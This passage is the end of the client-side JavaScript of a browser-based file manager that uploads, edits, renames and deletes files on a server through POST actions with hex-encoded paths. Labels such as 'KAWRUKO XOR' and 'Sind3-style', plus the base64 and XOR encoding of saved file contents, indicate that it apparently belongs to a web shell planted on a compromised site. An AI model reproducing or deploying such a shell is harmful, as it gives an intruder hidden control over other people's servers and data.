                    
                    if (result.success) {
                        showNotification('Uploaded via primary method: ' + result.message, 'success');
                    } else {
                        throw new Error(result.message || 'Primary method failed');
                    }
                } catch (primaryError) {
                    console.log('Primary method failed, trying alternative...', primaryError);
                    showNotification('Primary failed, trying alternative method...', 'info');
                    
                    try {
                        // Fallback to alternative method
                        result = await uploadFileAlternative(file, encodedData);
                        $('.progress-bar').css('width', '100%');
                        
                        if (result.success) {
                            showNotification('Uploaded via alternative method: ' + result.message, 'success');
                        } else {
                            throw new Error(result.message || 'Alternative method also failed');
                        }
                    } catch (altError) {
                        throw new Error('Both upload methods failed: ' + altError.message);
                    }
                }
                
                $('#uploadModal').modal('hide');
                refreshTable();
                
            } catch (error) {
                showNotification('Upload failed: ' + error.message, 'error');
                console.error('Upload error:', error);
            } finally {
                setTimeout(() => {
                    $('#uploadProgress').hide();
                    $('.progress-bar').css('width', '0%');
                }, 1000);
            }
        }
        
        function editFile(filename) {
            currentEditingFile = filename;
            
            $.post('?d=' + currentDirHex, {
                action: 'get_file_content',
                name: filename
            }, function(response) {
                if (response.success) {
                    if (response.is_binary) {
                        // Show binary file info (using Sind3-style detection)
                        $('#editModalTitle').text('View Binary File: ' + filename + ' (Read Only)');
                        $('#textEditor').hide();
                        $('#binaryViewer').show();
                        $('#saveButton').hide();
                        $('#binarySize').text(formatBytes(response.size));
                        showNotification('Binary file loaded (read-only) - ' + formatBytes(response.size), 'info');
                    } else {
                        // Show text editor for text files (using Sind3-style content reading)
                        $('#editModalTitle').text('Edit Text File: ' + filename + ' (KAWRUKO XOR)');
                        $('#binaryViewer').hide();
                        $('#textEditor').show();
                        $('#saveButton').show();
                        $('#fileContent').val(response.content);
                    }
                    $('#editModal').modal('show');
                } else {
                    showNotification('Error: ' + response.message, 'error');
                }
            }, 'json').fail(function() {
                showNotification('Failed to load file content', 'error');
            });
        }
        
        function saveFile() {
            const plain = $('#fileContent').val();
            
            // Use KAWRUKO editor encoding method
            const bin = editorEncodeToBinaryString(plain);
            const b64 = b64EncodeBinary(bin);
            
            $.post('?d=' + currentDirHex, {
                action: 'edit_file',
                name: currentEditingFile,
                content_b64: b64
            }, function(response) {
                if (response.success) {
                    $('#editModal').modal('hide');
                    showNotification(response.message, 'success');
                    refreshTable();
                } else {
                    showNotification('Error: ' + response.message, 'error');
                }
            }, 'json').fail(function() {
                showNotification('Failed to save file', 'error');
            });
        }
        
        function renameItem(name) {
            currentRenamingItem = name;
            $('#newName').val(name);
            $('#renameModal').modal('show');
        }
        
        function performRename() {
            const newName = $('#newName').val().trim();
            if (!newName) {
                showNotification('Please enter a new name', 'error');
                return;
            }
            
            $.post('?d=' + currentDirHex, {
                action: 'rename',
                old_name: currentRenamingItem,
                new_name: newName
            }, function(response) {
                if (response.success) {
                    $('#renameModal').modal('hide');
                    showNotification(response.message, 'success');
                    refreshTable();
                } else {
                    showNotification('Error: ' + response.message, 'error');
                }
            }, 'json').fail(function() {
                showNotification('Rename request failed', 'error');
            });
        }
        
        function deleteItem(name) {
            if (confirm('Are you sure you want to delete "' + name + '"?')) {
                $.post('?d=' + currentDirHex, {
                    action: 'delete',
                    name: name
                }, function(response) {
                    if (response.success) {
                        showNotification(response.message, 'success');
                        refreshTable();
                    } else {
                        showNotification('Error: ' + response.message, 'error');
                    }
                }, 'json').fail(function() {
                    showNotification('Delete request failed', 'error');
                });
            }
        }
        
        function refreshTable() {
            navigateToPath(currentDirHex);
        }
    </script>
</body>
</html>
